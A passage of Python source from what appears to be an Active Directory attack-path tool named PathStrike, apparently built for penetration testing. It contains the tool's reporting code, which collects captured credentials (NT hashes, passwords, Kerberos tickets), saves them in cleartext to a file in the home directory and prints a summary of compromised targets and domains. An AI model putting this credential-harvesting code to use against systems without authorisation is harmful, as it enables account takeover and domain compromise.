            # Show unique edge types in order, not all 71 steps
            seen = []
            for s in sp.path.steps:
                if not seen or seen[-1] != s.edge.edge_type:
                    seen.append(s.edge.edge_type)
            edges = " → ".join(seen)

            table.add_row(
                str(i),
                f"{sp.composite_score:.1f}",
                describe_score(sp.target_score),
                sp.path.target.name,
                sp.domain,
                str(len(sp.path.steps)),
                edges,
            )

        console.print(table)

    def _snapshot_credentials(self) -> list[dict[str, str]]:
        """Snapshot all credentials from the store before they get wiped."""
        creds: list[dict[str, str]] = []
        for key, cred_list in self.cred_store._credentials.items():
            for cred in cred_list:
                creds.append({
                    "username": cred.username,
                    "domain": cred.domain,
                    "type": cred.cred_type.value,
                    "value": cred.value,
                    "obtained_from": cred.obtained_from or "",
                })
        return creds

    def _save_credentials_file(self) -> None:
        """Save captured credentials to a file."""
        if not self._captured_creds:
            return

        import os
        from pathlib import Path

        creds_dir = Path.home() / ".pathstrike"
        creds_dir.mkdir(parents=True, exist_ok=True)
        creds_file = creds_dir / "campaign_credentials.txt"

        with open(creds_file, "w") as fh:
            fh.write("# PathStrike Campaign Credentials\n")
            fh.write(f"# Captured: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for cred in self._captured_creds:
                fh.write(
                    f"{cred['domain']}/{cred['username']}  "
                    f"[{cred['type']}]  {cred['value']}\n"
                )
                if cred["obtained_from"]:
                    fh.write(f"  # {cred['obtained_from']}\n")

        # Set restrictive permissions
        os.chmod(creds_file, 0o600)
        console.print(
            f"\n[bold]Credentials saved to:[/] [green]{creds_file}[/]"
        )

    def _display_campaign_summary(self, result: CampaignResult) -> None:
        """Show final campaign results."""
        console.print("\n" + "═" * 60)
        console.print("[bold]Campaign Summary[/]")
        console.print("═" * 60)

        if result.targets_compromised:
            console.print(f"\n[bold green]Targets compromised ({len(result.targets_compromised)}):[/]")
            for t in result.targets_compromised:
                console.print(f"  ✅ {t}")
        else:
            console.print("\n[yellow]No targets compromised.[/]")

        if result.domains_compromised:
            console.print(f"\n[bold red]Domains compromised ({len(result.domains_compromised)}):[/]")
            for d in result.domains_compromised:
                console.print(f"  🏴 {d}")

        # Show captured credentials with actual values
        if self._captured_creds:
            console.print(f"\n[bold cyan]Captured Credentials ({len(self._captured_creds)}):[/]")
            for cred in self._captured_creds:
                ctype = cred["type"]
                user = cred["username"]
                domain = cred["domain"]
                value = cred["value"]

                if ctype == "nt_hash":
                    console.print(
                        f"  💎 [green]{domain}/{user}[/]  "
                        f"[yellow]NT Hash:[/] {value}"
                    )
                elif ctype == "password":
                    console.print(
                        f"  🔑 [green]{domain}/{user}[/]  "
                        f"[yellow]Password:[/] {value}"
                    )
                elif ctype == "ccache":
                    console.print(
                        f"  🎫 [green]{domain}/{user}[/]  "
                        f"[yellow]Ticket:[/] {value}"
                    )
                else:
                    console.print(
                        f"  🔐 [green]{domain}/{user}[/]  "
                        f"[yellow]{ctype}:[/] {value}"
                    )

        console.print(f"\nPaths attempted: {result.total_paths_attempted}")
        console.print(f"Paths succeeded: [green]{result.total_paths_succeeded}[/]")
        console.print(f"Paths failed: [red]{result.total_paths_failed}[/]")
        console.print(f"Duration: {result.duration_seconds:.1f}s")
        console.print("═" * 60)
